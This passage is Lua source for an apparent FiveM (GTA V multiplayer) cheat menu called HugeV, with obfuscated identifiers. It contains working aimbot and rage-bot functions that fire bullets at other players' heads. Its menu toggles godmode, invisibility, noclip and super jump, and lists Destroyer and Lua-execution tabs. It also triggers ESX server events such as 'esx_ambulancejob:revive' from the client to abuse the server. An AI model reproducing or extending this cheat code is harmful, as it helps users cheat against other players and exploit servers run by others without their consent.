    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 0, GetNumVehicleMods(vehicle_dugsdifg, 0) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 1, GetNumVehicleMods(vehicle_dugsdifg, 1) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 2, GetNumVehicleMods(vehicle_dugsdifg, 2) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 3, GetNumVehicleMods(vehicle_dugsdifg, 3) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 4, GetNumVehicleMods(vehicle_dugsdifg, 4) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 5, GetNumVehicleMods(vehicle_dugsdifg, 5) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 6, GetNumVehicleMods(vehicle_dugsdifg, 6) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 7, GetNumVehicleMods(vehicle_dugsdifg, 7) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 8, GetNumVehicleMods(vehicle_dugsdifg, 8) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 9, GetNumVehicleMods(vehicle_dugsdifg, 9) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 10, GetNumVehicleMods(vehicle_dugsdifg, 10) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods(vehicle_dugsdifg, 11) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods(vehicle_dugsdifg, 12) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods(vehicle_dugsdifg, 13) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 14, 16, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods(vehicle_dugsdifg, 15) - 2, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods(vehicle_dugsdifg, 16) - 1, false)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 20, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 22, true)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 23, 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 24, 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 25, GetNumVehicleMods(vehicle_dugsdifg, 25) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 27, GetNumVehicleMods(vehicle_dugsdifg, 27) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 28, GetNumVehicleMods(vehicle_dugsdifg, 28) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 30, GetNumVehicleMods(vehicle_dugsdifg, 30) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 33, GetNumVehicleMods(vehicle_dugsdifg, 33) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 34, GetNumVehicleMods(vehicle_dugsdifg, 34) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 35, GetNumVehicleMods(vehicle_dugsdifg, 35) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 38, GetNumVehicleMods(vehicle_dugsdifg, 38) - 1, true)
    Czitirzen_InvokeNative(0x57C51E6BAD752696, vehicle_dugsdifg, 1)
    Czitirzen_InvokeNative(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
    Czitirzen_InvokeNative(0x9088EB5A43FFB0A1, vehicle_dugsdifg, 5)
end

function full_tuning_pref_dugisdgdsfgidf(vehicle_dugsdifg)
    Czitirzen_InvokeNative(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods(vehicle_dugsdifg, 11) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods(vehicle_dugsdifg, 12) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods(vehicle_dugsdifg, 13) - 1, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods(vehicle_dugsdifg, 15) - 2, false)
    Czitirzen_InvokeNative(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods(vehicle_dugsdifg, 16) - 1, false)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
    Czitirzen_InvokeNative(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
    Czitirzen_InvokeNative(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
end

local function AddVectors(to_vector_1_IDUHGISJGFDG, to_vector_2_DOIHGIUOSDGRF)
    return vector3(
        to_vector_1_IDUHGISJGFDG.x + to_vector_2_DOIHGIUOSDGRF.x,
        to_vector_1_IDUHGISJGFDG.y + to_vector_2_DOIHGIUOSDGRF.y,
        to_vector_1_IDUHGISJGFDG.z + to_vector_2_DOIHGIUOSDGRF.z
    )
end

local function rage_bot_shoot_SUGUYFSDHIFDG(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
    local boneTarget_UDHGIHDUFIURDFG =
        GetPedBoneCoords(target_udhsgidgsdfg, HugeV.locals.AllBones["HEAD"], 0.0, 0.0, 0.0)
    local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
    Czitirzen_InvokeNative(
        0x867654CBC7606F2C,
        AddVectors(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)),
        boneTarget_UDHGIHDUFIURDFG,
        damage_dighsdiugsdfgr,
        true,
        weapon_IDHIFUSDGFDG,
        Czitirzen_InvokeNative(0xD80958FC74E988A6),
        true,
        true,
        1000.0
    )
end

local function rage_bot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if not Czitirzen_InvokeNative(0x3317DEDB88C95038, player_duhfiudshgisdf) then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg =
            table.unpack(GetEntityCoords(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD =
            World3dToScreen2d(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if
            _x_ADIFJIDSGJDSIGISDGSD > HugeV.locals.fov_x and _x_ADIFJIDSGJDSIGISDGSD < HugeV.locals.fov_x2 and
                _y_SDDSIHUGISDGSD > HugeV.locals.fov_y and
                _y_SDDSIHUGISDGSD < HugeV.locals.fov_y2
         then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
            rage_bot_shoot_SUGUYFSDHIFDG(player_duhfiudshgisdf, nil, GetWeaponDamage(weapon_IDHIFUSDGFDG, 1))
        end
    end
end

--[[local function aimbot_shoot(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
if multipoint_aimbot then
	local to_shoot = {}
		for k, v in pairs(HugeV.locals.AllBones) do
			if HugeV.locals.SelectedBones[k] then
				table.insert(to_shoot, v)
			end
		end

if #to_shoot == 0 or #to_shoot == nil then
else
	local ktore = math.random(1, #to_shoot)
	if shooted_DSUGHUDSGSD then
		-- nic
	else
		local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords(target_udhsgidgsdfg, GetEntityBoneIndexByName(target_udhsgidgsdfg, to_shoot[ktore]), 0.0, 0.0, 0.0)
		local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
		Czitirzen_InvokeNative(0x867654CBC7606F2C, AddVectors(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, Czitirzen_InvokeNative(0xD80958FC74E988A6), true, true, 1000.0)
		shooted_DSUGHUDSGSD = true
		Citizen.Wait(500)
		shooted_DSUGHUDSGSD = false
	end
end
else
	if shooted_DSUGHUDSGSD then
		-- nic
	else
		local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords(target_udhsgidgsdfg, HugeV.locals.AllBones["HEAD"], 0.0, 0.0, 0.0)
		local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
		Czitirzen_InvokeNative(0x867654CBC7606F2C, AddVectors(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, Czitirzen_InvokeNative(0xD80958FC74E988A6), true, true, 1000.0)
		shooted_DSUGHUDSGSD = true
		Citizen.Wait(500)
		shooted_DSUGHUDSGSD = false
	end
end
end]]
local function aimbot_shoot(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
    if multipoint_aimbot then
        local to_shoot = {}
        for k, v in pairs(HugeV.locals.AllBones) do
            if HugeV.locals.SelectedBones[k] then
                table.insert(to_shoot, v)
            end
        end

        if #to_shoot == 0 or #to_shoot == nil then
        else
            local ktore = math.random(1, #to_shoot)
            local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords(target_udhsgidgsdfg, to_shoot[ktore], 0.0, 0.0, 0.0)
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
            Czitirzen_InvokeNative(
                0x867654CBC7606F2C,
                AddVectors(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)),
                boneTarget_UDHGIHDUFIURDFG,
                damage_dighsdiugsdfgr,
                true,
                weapon_IDHIFUSDGFDG,
                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                true,
                true,
                1000.0
            )
        end
    else
        local boneTarget_UDHGIHDUFIURDFG =
            GetPedBoneCoords(target_udhsgidgsdfg, HugeV.locals.AllBones["HEAD"], 0.0, 0.0, 0.0)
        local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
        Czitirzen_InvokeNative(
            0x867654CBC7606F2C,
            AddVectors(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)),
            boneTarget_UDHGIHDUFIURDFG,
            damage_dighsdiugsdfgr,
            true,
            weapon_IDHIFUSDGFDG,
            Czitirzen_InvokeNative(0xD80958FC74E988A6),
            true,
            true,
            1000.0
        )
    end
end

local function legit_aimbot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if
        Czitirzen_InvokeNative(0xE659E47AF827484B, player_duhfiudshgisdf) and
            not Czitirzen_InvokeNative(0x3317DEDB88C95038, player_duhfiudshgisdf) and
            Czitirzen_InvokeNative(0x91AEF906BCA88877, 0, 24) and
            Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 19) and
            Czitirzen_InvokeNative(0x2E397FD2ECD37C87, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6))
     then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg =
            table.unpack(HugeV.functions.getEntityCoords(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD =
            World3dToScreen2d(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if
            _x_ADIFJIDSGJDSIGISDGSD > HugeV.locals.fov_x and _x_ADIFJIDSGJDSIGISDGSD < HugeV.locals.fov_x2 and
                _y_SDDSIHUGISDGSD > HugeV.locals.fov_y and
                _y_SDDSIHUGISDGSD < HugeV.locals.fov_y2
         then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon(Czitirzen_InvokeNative(0xD80958FC74E988A6))
            aimbot_shoot(player_duhfiudshgisdf, "", GetWeaponDamage(weapon_IDHIFUSDGFDG, 1))
        end
    end
end

function LeftBar_GOre()
    if MenuButton_czlowiek_DS("Self", false, 0.295, 0.27) then
        HugeV.locals.selected = "Self"
        HugeV.locals.current_tab = "Self"
    end

    if MenuButton_czlowiek_DS("Rage", false, 0.295, 0.3) then
        HugeV.locals.selected = "Rage"
        HugeV.locals.current_tab = "Rage"
    end

    if MenuButton_czlowiek_DS("Legit", false, 0.295, 0.33) then
        HugeV.locals.selected2 = "Aimbot"
        HugeV.locals.selected = "Legit"
        HugeV.locals.current_tab = "Legit"
    end

    if MenuButton_czlowiek_DS("Visual", false, 0.295, 0.36) then
        HugeV.locals.selected = "Visual"
        HugeV.locals.current_tab = "Visual"
    end

    if MenuButton_czlowiek_DS("Players", false, 0.295, 0.39) then
        HugeV.locals.selected = "Players"
        HugeV.locals.current_tab = "Players"
    end

    if MenuButton_czlowiek_DS("Vehicle", false, 0.295, 0.42) then
        HugeV.locals.selected = "Vehicle"
        HugeV.locals.current_tab = "Vehicle"
        HugeV.locals.selected2 = "Vehicle Options"
    end

    if MenuButton_czlowiek_DS("Weapon", false, 0.295, 0.45) then
        HugeV.locals.selected = "Weapon"
        HugeV.locals.current_tab = "Weapon"
    end

    if MenuButton_czlowiek_DS("Misc", false, 0.295, 0.48) then
        HugeV.locals.selected = "Misc"
        HugeV.locals.current_tab = "Misc"
    end
    if MenuButton_czlowiek_DS("Teleport", false, 0.295, 0.51) then
        HugeV.locals.selected = "Teleport"
        HugeV.locals.current_tab = "Teleport"
        HugeV.locals.selected2 = "Teleport Main"
    end

    if MenuButton_czlowiek_DS("Freecam", false, 0.295, 0.54) then
        HugeV.locals.selected = "Freecam"
        HugeV.locals.current_tab = "Freecam"
    end

    if MenuButton_czlowiek_DS("Lua", false, 0.295, 0.57) then
        HugeV.locals.selected = "Lua"
        HugeV.locals.current_tab = "Lua"
    end

    if MenuButton_czlowiek_DS("Destroyer", false, 0.295, 0.60) then
        HugeV.locals.selected = "Destroyer"
        HugeV.locals.current_tab = "Destroyer"
    end

    if MenuButton_czlowiek_DS("Settings", false, 0.295, 0.63) then
        HugeV.locals.selected = "Settings"
        HugeV.locals.current_tab = "Settings"
    end

    if MenuButton_czlowiek_DS("~r~DISABLE MENU", false, 0.29, 0.73) then
        HugeV.locals.MenuEnabled = false
    end

    --bar_antekr5(0.385,0.5,0.368)
end

function tabs_grherher()
    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_kd_icon",
        0.285,
        0.30,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest RAGE )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_globe_icon",
        0.285,
        0.33,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest LEGIT )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_players_icon",
        0.285,
        0.27,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest SELF )

    DrawSprite_HugeWare_SDGUHSFDIGDFG("mphud", "spectating", 0.285, 0.36, 0.015, 0.04, 0.0, 255, 255, 255, 255) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest VISUAL )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_friends_icon",
        0.285,
        0.39,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest PLAYERS )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_transport_car_icon",
        0.285,
        0.42,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest VEHICLE )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_kd_icon",
        0.285,
        0.45,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest WEAPONS )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_star_icon",
        0.285,
        0.48,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest MISC )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_transport_plane_icon",
        0.285,
        0.51,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest TELEPORT )

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_cash_icon",
        0.285,
        0.57,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest Lua )

    DrawSprite_HugeWare_SDGUHSFDIGDFG("commonmenu", "shop_lock", 0.285, 0.54, 0.015, 0.04, 0.0, 255, 255, 255, 255) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest Freecam )

    DrawSprite_HugeWare_SDGUHSFDIGDFG("timerbars", "boost", 0.285, 0.60, 0.015, 0.04, 0.0, 255, 255, 255, 255) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest Destroyer ) leaderboard_cash_icon

    DrawSprite_HugeWare_SDGUHSFDIGDFG(
        "mpleaderboard",
        "leaderboard_thumb",
        0.285,
        0.63,
        0.015,
        0.04,
        0.0,
        255,
        255,
        255,
        255
    ) -- prawo lewo , do gory PETLATYKURWOZONETAPAJEBANA dol, skala ( btw to jest SETTINGS )
    if HugeV.locals.current_tab == "Self" then
        if SlimCheckbox("Invisible", 0.36, 0.27, 0.27, HugeV.locals.Invisible) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.Invisible = not HugeV.locals.Invisible
            end
        end

        if SlimCheckbox("Infinite Stamina", 0.36, 0.29, 0.29, HugeV.locals.InfiniteStamina) then
            HugeV.locals.InfiniteStamina = not HugeV.locals.InfiniteStamina
        end

        if SlimCheckbox("Super Jump", 0.36, 0.31, 0.31, HugeV.locals.SuperJump) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.SuperJump = not HugeV.locals.SuperJump
            end
        end

        if SlimCheckbox("Tiny Player", 0.36, 0.33, 0.33, HugeV.locals.tinyplayer) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.tinyplayer = not HugeV.locals.tinyplayer
            end
        end

        if SlimCheckbox("Never Wanted", 0.36, 0.35, 0.35, HugeV.locals.NeverWanted) then
            HugeV.locals.NeverWanted = not HugeV.locals.NeverWanted
        end

        if SlimCheckbox("Become Flare", 0.36, 0.37, 0.37, HugeV.locals.MakeUFlare) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.MakeUFlare = not HugeV.locals.MakeUFlare
            end
        end

        if SlimCheckbox("Always Ragdoll", 0.36, 0.39, 0.39, HugeV.locals.Ragdoll) then
            HugeV.locals.Ragdoll = not HugeV.locals.Ragdoll
        end

        if SlimCheckbox("Godmode", 0.36, 0.41, 0.41, HugeV.locals.GodMode) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.GodMode = not HugeV.locals.GodMode
            end
        end

        if SlimCheckbox("Noclip", 0.36, 0.43, 0.43, HugeV.locals.Noclip) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.Noclip = not HugeV.locals.Noclip
            end
        end

        if SlimCheckbox("Camera Noclip ~g~NEW", 0.36, 0.45, 0.45, HugeV.locals.Noclip2) then
            HugeV.locals.Noclip2 = not HugeV.locals.Noclip2
        end

        if SlimCheckbox("Fastrun", 0.36, 0.47, 0.47, HugeV.locals.fastrun) then
            HugeV.locals.fastrun = not HugeV.locals.fastrun
        end

        if SlimButton_antekr5("Revive", false, 0.35, 0.49) then
            nativeRevive_API()
        end

        if SlimButton_antekr5("Revive ~g~ESX", false, 0.35, 0.51) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                TriggerServerEvent("esx_ambulancejob:revive")
            end
        end

        if SlimButton_antekr5("Suicide", false, 0.35, 0.53) then
            Czitirzen_InvokeNative(0x6B76DC1F3AE6E6A3, Czitirzen_InvokeNative(0xD80958FC74E988A6), 0)
        end

        if SlimButton_antekr5("Set Health", false, 0.35, 0.55) then
            local chujchujsokin = KeyBoardInput_jdhgijslrgeg("Set Health Value (ex. 100 (100-200) )", "", 100)
            Czitirzen_InvokeNative(
                0x6B76DC1F3AE6E6A3,
                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                tonumber(chujchujsokin)
            )
        end

        if SlimButton_antekr5("Set Armour", false, 0.35, 0.57) then
            local chujchujsokin = KeyBoardInput_jdhgijslrgeg("Set Armour Value (ex. 200 (1-200) )", "", 100)
            Czitirzen_InvokeNative(
                0xCEA04D83135264CC,
                Czitirzen_InvokeNative(0xD80958FC74E988A6),
                tonumber(chujchujsokin)
            )
        end
        if SlimButton_antekr5("Set ~b~thirst ~s~to ~g~100 ~g~ESX", false, 0.35, 0.59) then
            TriggerEvent("esx_status:set", "thirst", 1000000)
        end
        if SlimButton_antekr5("Set ~o~hunger ~s~to ~g~100 ~g~ESX", false, 0.35, 0.61) then
            TriggerEvent("esx_status:set", "hunger", 1000000)
        end
    elseif HugeV.locals.current_tab == "Teleport" then
        if MenuButton_czlowiek_DS_2("Teleport Main", false, 0.35, 0.27) then
            HugeV.locals.selected2 = "Teleport Main"
        end

        if MenuButton_czlowiek_DS_2("Places On The Map", false, 0.39, 0.27) then
            HugeV.locals.selected2 = "Places On The Map"
        end
        if HugeV.locals.selected2 == "Teleport Main" then
            if SlimButton_antekr5("Teleport To Coords ~r~ERROR", false, 0.35, 0.3) then
                nativeRevive_API()
            end
            if SlimButton_antekr5("Teleport To Waypoint ~r~ERROR", false, 0.35, 0.32) then
                nativeRevive_API()
            end
            if SlimButton_antekr5("Waypoint to Coords ~r~ERROR", false, 0.35, 0.34) then
                nativeRevive_API()
            end
        elseif HugeV.locals.selected2 == "Places On The Map" then
            -- Clothing Job --
            if SlimButton_antekr5("Paleto Bay", false, 0.35, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, -4.5, 6521.2, 30.5)
            end
            if SlimButton_antekr5("Zancudo", false, 0.35, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, 1678.05, 4819.88, 41.29)
            end
            if SlimButton_antekr5("Sandy Shores", false, 0.35, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, 1179.67, 2691.37, 15.4)
            end
            if SlimButton_antekr5("Strawberry", false, 0.35, 0.36) then
                SetEntityCoords(HugeV.Player.PedId, 89.320786, -1392.317627, 30.4)
            end
            if SlimButton_antekr5("Great Chaparral", false, 0.35, 0.38) then
                SetEntityCoords(HugeV.Player.PedId, -1089.4, 2697.03, 19.44)
            end
            if SlimButton_antekr5("Havick", false, 0.35, 0.4) then
                SetEntityCoords(HugeV.Player.PedId, 134.122055, -200.21133, 53.86409)
            end
            if SlimButton_antekr5("Del Perro", false, 0.35, 0.42) then
                SetEntityCoords(HugeV.Player.PedId, -1210.620361, -784.16021, 16.549015)
            end
            if SlimButton_antekr5("Burtan", false, 0.35, 0.44) then
                SetEntityCoords(HugeV.Player.PedId, -148.234741, -308.07, 38.104)
            end
            if SlimButton_antekr5("Rockford Hills", false, 0.35, 0.46) then
                SetEntityCoords(HugeV.Player.PedId, -725.551453, -162.83371, 36.57)
            end
            if SlimButton_antekr5("Morningwood", false, 0.35, 0.48) then
                SetEntityCoords(HugeV.Player.PedId, -1460.654, -227.55, 48.72)
            end
            -- Barbers Shop --
            if SlimButton_antekr5("Havick", false, 0.395, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, -27.79, -136.86, 56.51)
            end
            if SlimButton_antekr5("Rockford Hills", false, 0.395, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, -1294.99, -1117.64, 6.15)
            end
            if SlimButton_antekr5("Vespucci", false, 0.395, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, -27.79, -136.86, 56.51)
            end
            if SlimButton_antekr5("Mirror Park", false, 0.395, 0.36) then
                SetEntityCoords(HugeV.Player.PedId, 1198.02, -471.81, 65.67)
            end
            if SlimButton_antekr5("Davis", false, 0.395, 0.38) then
                SetEntityCoords(HugeV.Player.PedId, 127.76, -1718.65, 28.65)
            end
            if SlimButton_antekr5("Paleto Bay", false, 0.395, 0.4) then
                SetEntityCoords(HugeV.Player.PedId, -286.63, 6239.38, 30.56)
            end
            if SlimButton_antekr5("Sandy Shores", false, 0.395, 0.42) then
                SetEntityCoords(HugeV.Player.PedId, 1938.35, 3717.8, 31.6)
            end
            -- Airports --
            if SlimButton_antekr5("Flight School", false, 0.45, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, -1142.4, -2697.3, 13.77)
            end
            if SlimButton_antekr5("Los Santos Airport", false, 0.45, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, -1070.9, -2972.122, 13.77)
            end
            if SlimButton_antekr5("Sandy Shores", false, 0.45, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, 1682.19, 3279.98, 40.6)
            end
            if SlimButton_antekr5("McKenzie Airfield", false, 0.45, 0.36) then
                SetEntityCoords(HugeV.Player.PedId, 2124.62, 4805.27, 40.47)
            end
            -- Garages --
            if SlimButton_antekr5("Mort Mutual Insurance", false, 0.51, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, -221.74, -1158.24, 23.04)
            end
            if SlimButton_antekr5("Bennys Garage", false, 0.51, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, -196.34, -1303.1, 30.65)
            end
            if SlimButton_antekr5("Beekers Garage", false, 0.51, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, 116.22, 6606.2, 31.46)
            end
